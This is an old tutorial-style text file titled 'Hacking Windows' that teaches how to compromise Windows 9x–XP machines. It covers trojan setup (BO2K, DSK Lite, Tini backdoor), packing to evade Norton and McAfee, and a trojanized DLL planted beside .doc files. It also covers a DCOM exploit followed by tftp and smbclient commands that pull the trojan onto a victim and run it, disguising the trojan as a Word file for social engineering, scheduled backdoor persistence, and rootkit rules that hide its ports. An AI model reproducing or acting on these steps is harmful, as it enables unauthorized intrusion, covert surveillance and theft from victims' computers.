HACKING WINDOWS
~~~~~~~~~~~~~~~

1.  INTRO
    This paper describes how to hack Microsoft Windows 9x/ME/2000/XP and install
backdoors. It also covers configuring bo2k server and client, Dsk Lite v.1,
Tini Backdoor and how to bypass antivirus programs, and install a windows 
rootkit.

2.  THE TOOLS
	All hacking needs to use tools. The hacking tools are all on the 
Internet. 

2.1  BO2K
	This tool  is an Open Source remote administration tool and  is downloaded from:

	http://www.bo2k.com

You should download bo2k version 1.0 - since it is the stable release and also
because it has the most number of plugins. Download all the plugins. The list
of binaries you should download are:

   a. bo2k_1.0.zip
   b. cli_botool_1.0.zip
   C. srv_bt2k_1-2.zip
   d. srv_ricq_0-00.zip


	
2.1.1  bo2k_1.0.zip

	This is the main program. After unzipping you will find the following
files:

   a.  bo2k.exe [DO NOT CLICK THIS - it is the server]
   b.  bo2kgui.exe [The client manager part]
   c.  bo2kcfg.exe [To configure bo2k.exe before deployment]
   d.  bo_peep.dll [Plugin for remote desktop viewing/hijacking]


Do not use the original bo2k.exe. Instead make a copy called sysdll.exe and
use it instead. Use bo2kcfg.exe to open sysdll.exe. Set the port to 33333 or
any unused port numbers between 1024 and insert the plugins below, except
srv_ricq_0-00.zip, which doesn't work. Note that cli_botool is the client
portion and as such such be inserted into bo2kgui.exe, by using bo2kgui.exe to
insert. Click on the Configure... button on the Menubar and then Insert... 



2.1.2  clt_botool.dll [cli_botool_1.0.zip]

	This client-side plugin enables you to remotely manage the victim's 
filesystem just like Windows Explorer. But more than that it enables you to 
upload and download files as well.


2.1.3   bo_peep.dll

	This client and server plugin comes with the main bo2k package. Use
bo2kcfg.exe to insert into sysdll.exe and bo2kgui.exe to insert into the
client part.


2.1.4   bt2k.dll [srv_bt2k_1-2.zip]

	This server plugin enables the server to send you email once the victim 
goes on the Internet.


2.1.5    srv_ricq.dll [srv_ricq_0-00.zip]

	This plugin informs you by icq messenger once the victim goes on the
Internet. But for some unknown reason, it doesn't work. It actually sends the
pager to wwp.icq.com.  But the server somehow never sends the pager.



Note however, that Norton Antivirus, McAfee and probably many others classify bo2k
as a trojan. 



2.1.6		Stealth Option Variable

Note that the trojan will still start on reboot if you had Enabled the 
"Run at startup" in the "Stealth" Option Variable. However, do not enable 
"Insidious" or "Hide Process" as this will cause it not to work on Win2000/XP.



2.2	 NEOLITE VERSION 2

[PED compressor is a much better alternative, see 8 below]

This is the tool used to compress the bo2k server so that Antivirus programs
can't detect bo2k. It is not a normal compressor like Winzip. Neolite can compress
an exe program so that the program can still execute after compression. The
compresed bo2k server program also runs faster. Compression upto about 50% is achieved, 
ie, from 300 kB to 136 kB. The resulting smaller file makes it all the more
faster to drop into the victim's machine. Neolite v.2 is downloaded from:

	http://sac-ftp.externet.hu/pack12.html

The binary is called:

	neolte20.zip 

and is described as a Windows 32-bit EXE and DLL compressor. But there is a
catch.  Neolite v.2 is a trial version. In this trial version, the compressed
bo2k server will popup a dialogue box to tell the victim that bo2k has been
compressed with neolite - not very helpful. As such we need to download a
crack for neolite. The crack will convert Neolite into a full version and
will disable the popup dialog.
 

	evc_nl20.zip

which, when unzipped yields these files:

	PATCH.COM
	evc.nfo
	file_id.diz

Just copy all three into the same folder as neolite.exe. The, run PATCH.COM.
A dos window will popup and inform you that neolite.exe has been successfully
patched.  Thereafter, to use neolite, just execute the neolite.exe. A much
better solution than te_loader.exe.
Note that evc_nl20.zip is downloaded from:

	www.bugs2k.com/n-03.html


Note that the crack only works on WinME, it doesn't work on WinXP. On the latter
it will yield an error message:  "Error initializing...". So you will need to modify
your sysdll.exe trojan on an WinME PC. On, Win2000, use PED compressor, instead.


After unzipping it, copy all its binaries and files to the same folder 
where the original Neolite resides, usually:

	C:\Program Files\NeoLite\

The original binary is:

	NeoLite.exe


Once the dialog box opens, do not change any of the default, just click
on Compress (the normal compress).


	

2.3   STEALTH TOOLS V.2 BY GOBO

Stealth Tools version 2 is used to modify the trojan so as to avoid detection.
It can be obtained from:

	www.megasecurity.org/Tools/Stealthtools_all.html

There are two versions, but both functions the same:

	Stealthtools2.0.zip
	Stealthtools2.0fe.zip



3.   BYPASSING ANTIVIRUS

The trojan bo2k dates back to 2000 and all Antivirus scanners are sure to
have its signature. This section describes two antivirus scanners and how
to bypass them.


3.1   SYMANTEC NORTON ANTIVIRUS 2003

Use Neolite v.2 to do a normal compress on sysdll.exe.
Then do a scan using Norton. It will fail to detect the trojan.
But, McAfee Virus Scan 2004 home edition can still detect it.


3.2   MC AFEE VIRUS SCAN 2004 (HOME EDITION)

Use Stealthtools v.2 to add 1000 bytes to sysdll.exe.
Then use Neolite v.2 to do a normal compress.
Then scan with Mc Afee. It will not be able to detect it any more
but the trojan can still execute.

	I also scanned it with McAfee Enterprise edition and it also
could not detect the trojan.


4.    PENETRATION AND INSERTION

In this section we will look at how to insert sysdll.exe into a Target.


4.1   INSERTION WITHOUT USER INTERVENTION

Insertion strategies depends on whether it is Win9x/ME or WinXP.
If it is Win9x/ME, and if C drive is shared, then insert into Startup Folder
after connecting on the NetBIOS share. If the C:\ folder is NOT shared,
then insert it in any folder that is shared which contains any .doc file.
Recompile riched20.dll with Microsoft Visual C++  to tinclude the path to
the sysdll.exe and copy riched20.dll to the same folder as sysdll.exe and 
the .doc file. Whenever the user opens the .doc file, it will attach the 
riched20.dll which is in the same folder as the .doc file. The trojanized 
riched20.dll will then execute our sysdll.exe.


If it is WinXP, then use dcom-rpc exploit to get C:\ shell, then ftp to
drop site and download sysdll.exe, then directly execute it:

	C:\WINDOW\system\sysdll.exe

You can't do this in Win98/ME, because you do not have the shell when you
connect via NetBIOS port 139. Also note that the trojanized riched20.dll doesn't 
work on WinXP, although WinXP does have riched20.dll and riched32.dll.


On Linux, the dcom exploit is called oc192-dcom.c and is easier to use, since
you do not have to specify the Service Pack version of Win2000 or WinXP.


An faster way is to use tftp on win200/XP:

	C:\tftp -i 192.168.1.1 GET sysdll.exe C:\WINNT\sysdll.exe

Then execute the trojan:

	C:\WINNT\sysdll.exe

Use your Linux server to run the tftpd server as follows.  Create a directory
called /tftpboot and put sysdll.exe in it. Then start the tftpd server as follows:

	chkconfig tftp on

Then confirm with netstat:

	netstat -uan

You should see udp port 69.


Note that the trojan will still start on reboot if you had Enabled the 
"Run at startup" in the "Stealth" Option Variable. 


It appears that the ISP's are blocking port 69 traffic, so tftp will not work on the
Internet. On the LAN, it works like a charm. To solve this problem use netbios to
share the victim's  C: drive instead. After exploiting with oc192-dcom.c exploit from
a Linux box, you will get this terminal:

	C:\

Run this command:

	C:\net share cdrive=C:\


Then, open another xterm and connect with samba:

	smbclient //VICTIM/cdrive -I 219.95.10.12

assuming, for example that the target's name is VICTIM and its IP is as above.
Then, 

	smb: \>put sysdll.exe

Go back to the other xterm where you had the dos shell and do this:

	C:\sysdll.exe

and connect with a bo2kgui client from a WinME box.



To delete share later:

	C:\net share /delete  


You may find that the C:\ is non-writable although you may be able to connect.
To solve this problem create a new share on SharedDocs which is the default
share folder on WinXP:

	net share myshare="C:\Documents and Settings\All Users\Documents"

which, on WinXP is symbolically linked as SharedDocs.

Then, use Netbrute to scan the target and open "myshare" created above.
You could also use Linux's smbclient to connect:

	smbclient //victim/myshare -I 219.95.2.3
	smb: \>put sysdll.exe


4.2    INSERTION WITH USER-INTERVENTION

[Elitewrap also works on Windows 2000]


This involves social engineering. We trick the user into executing the trojan.
We pack a normal program eg, notepad.exe with sysdll.exe to produce another file,
probably called textedit.exe.  When the user clicks on textedit.exe, notepad.exe will
launch to open the notepad workspace but sysdll.exe will also run hidden.  To do that,
we use elitewrap.exe.

	C:\elitewrap
	Enter name of output file: textedit.exe
	Perform CRC checking: n
      Enter package file #1: notepad.exe
	Enter operation: 2    [Pack and execute,visible,asynchronously]
	
This means you wish to pack notepad.exe into textedit.exe and you want notepad.exe
to execute when textedit.exe runs and you want it to be visible to the user.
Asynchronously means concurrently, ie, independently from the second program
sysdll.exe, which we will pack next.

	Enter command line: <Enter>
	Enter package file #2: sysdll.exe
	Enter operation: 3   [Pack and execute, hidden, asynchronously]

Note that we choose 3 this time, because we want it to execute hidden from the
user's view when textedit.exe runs. Again, asynchronously, means concurrently with
the first program notepad.exe, ie, do not wait for notepad.exe to complete.
	
	Enter command line: <Enter>
	Enter package file #3: <Enter>
	All done :)

The trojan is now packed and is called textedit.exe.

Next we need to replace the elitewrap icon with that of winword.exe
Use iconedit.exe to extract winword.exe icon. Do this by opening winword.exe
and extract and save as word.ico.  Then open the trojan textedit.exe with iconedit.exe
and replace the elitewrap icon with that of the winword icon of size 32*32*4.
Note that you could not use 48*48*8 icon to replace a 32*32*4 icon.
 

Download Easy Icon Maker v. 3 from:

	http://www.icon-editor.net/

and the crack from:

	http://crack.x-forum.info/ARCHIVE/X/XP+ICON.php

Install Easy Icon Maker, then copy the crack program into the folder where iconmaker.exe
is located. Then run the patch.



5.    WINDOWS XP and WIN2000 KEYLOGGING

All functions work without problems on Win98 and WinME.
Somehow the Keylogging function doesn't work on WinXP, for bo2k version 1.0
Alternatives:

	Use latest version of bo2k (ie, devel version)
	Use the keylogger i wrote
	Download third party keylogger


The bo2k keylogging function works on WIN2000.


6.	TARGET ACQUISITION 

Use netbrute.exe scanner to scan the pc's on the internet.  Check your IP first to
determine which subnet you are in. Then scan that subnet. Netbrute.exe does runs very
slow on WinXP. You should use it on WinME.


7.  DSK LITE TROJAN v1.0

Download from:

	http://astalavista.com/trojans/remote-tools/

The Client Program is DSK.exe. It is used to edit servers and also to connected to servers
on infected machines. The default ports are 890 and 891.

Click the "Edit Server" button and set as follows:

a.  Main
    Password: <your password>
    Ports: 890 891
    Vic Name: Cock Sucker

b.  Start Up
    Tick, Registry Run
    Server Name: winlogon.exe
    Registry Name: Windows Logon Application

c.  Notify
    Don't tick anything, we'll use bo2k's sysdll.exe	

d.  Fake Error
    Leave out

e.  Misc
    Leave out

f.   Server Builder
     Choose Build Server Unpacked (Large)
     So that we can compress with Neolite later.
     Then click "Build Server"

Then name the server as sysdsk.exe

Then compress it with Neolite using normal compress. No need to add
white bytes using Stealth. 



8.  PED COMPRESSOR

Download from:

	http://www.protools.cjb.net/

PE Diminisher is a simple PE packer. Just run it, open the file you want to pack, 
and select Encrypt File! Nice GUI. Using PED, no need Stealthtools by Gobo.
Just open sysdll.exe and encrypt. It bypasses NOrton and MacAfee.


Another advantage is that it runs on Win2000. The cracked Neolite doesn't.



9.  ESS BINDER v.1.0

Download from:

	http://astalavista.com/trojans/utilities/

Can wrap notepad.exe with sysdll.exe, etc.
Works on Win2000.  Note, however, that the output exe has got no icons and
therefore we can't change icons using Easy Icon Maker.


10.   TINI BACKDOOR

Download from:

	http://ntsecurity.nu/toolbox/tini/

No autostart upon reboot. To run, just execute it. Below is the FAQ from
the website.

What is Tini? 

Tini is a simple and very small (3kb) backdoor for Windows, coded in assembler. It listens at TCP port 7777 and gives anybody who connects a remote Command Prompt. 

How do I use this tool? 

Download the exe file and run it. Connect (with an ordinary telnet client or similar) to TCP port 7777 and press Enter once, now you'll see the Command Prompt and be able to type commands. 

Which OS's are supported? 

Windows 95 / 98 / ME / NT 4.0 / 2000 / XP. 

Tested on Win98 and Win2000.

After encrypting with PED Compressor it is undetectable by Norton and Macafee.


11.  AFX WINDOWS ROOTKIT 2003

[Tested on WinXP aka WinNT 5.1]

Hides files, processes, registries and ports.

Note that we can't simply write a netstat.exe trojan  and place it in
C:\winnt\system32, etc, because windows file protection system will
simply replace it with the original copy. But a rootkit solves this problem.

Downloaded as rootkit.zip from:
 

windows rootkit works on win9x/ME/2000/XP


Settings:
Processes   - UMGR.EXE [the bo2k sysdll.exe's process]
Files       - sysdll.exe
              winmgt.exe
              taskmgr.exe [ the rootkit ]
              squid.exe
        
Registry    - UMGR.EXE
Connections - *TCP*:33333*:*  [to hide sysdll.exe's UMGR.EXE]
	      *TCP*:44444*:*  [to hide cmd.exe portbind]
	      *TCP*:1028*:*   [to hide bo2k winmgt.exe]
	      *TCP*:15151*:*  [bopeep vidstream] 
	      *TCP*:14141*:*  [bopeep hijack]

To avoid antivirus [tested against Norton AV], PED compression fails, in this case.

Instead, use Gobo's Stealth tool to PACK and SCRAMBLE.



12.  USING AT to RUN BACKDOOR

Create a script called winmgt.bat as follows:

copy con winmgt.bat
@echo off
echo ^G
tiny.exe
<ctrl-z>

Then, schedule it to start at 11:00 am:

   at 11:00 C:\winnt\winmgt.bat

To check:

   at

To cancel:

   at 1 /delete

where 1 is the ID of the Task.


To run the backdoor tini.exe everyday at 8 p.m. :


   at 20:00 /every:M,Tu,W,Th,F,Sa,Su C:\winnt\winmgt.bat

13.  IP FORWARDING

To enable IP Forwarding on Windows 2000/XP, make the following
registry change:


[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters
]
"IPEnableRouter"="1"

For Windows 98/Me, make the following registry change instead:
[HKEY LOCAL MACHINE\System\CurrentControlSet\Services\VxD\MSTCP]
"EnableRouting"="1"

Note: if the "IPEnableRouter" (or "EnableRouting") value does not yet
exist under the aforementioned registry key, you will have to
manually add it. Select 'New' from the 'Edit' menu and add a new
DWORD value with the indicated name and value.


14.  AUTOEXEC.BAT AND WIN.INI

If a Win98 doesn't have a Startup folder, then, you could edit the 
C:\autoexec.bat or C:\windows\win.ini files to start the trojan. But it
won't work for WinME which will remove all those lines not related to
the setting fo environment variables.
 
In Win2000/XP, you edit these files instead:
	\WINNT\System32\Autoexec.nt \WINNT\System32\Config.nt
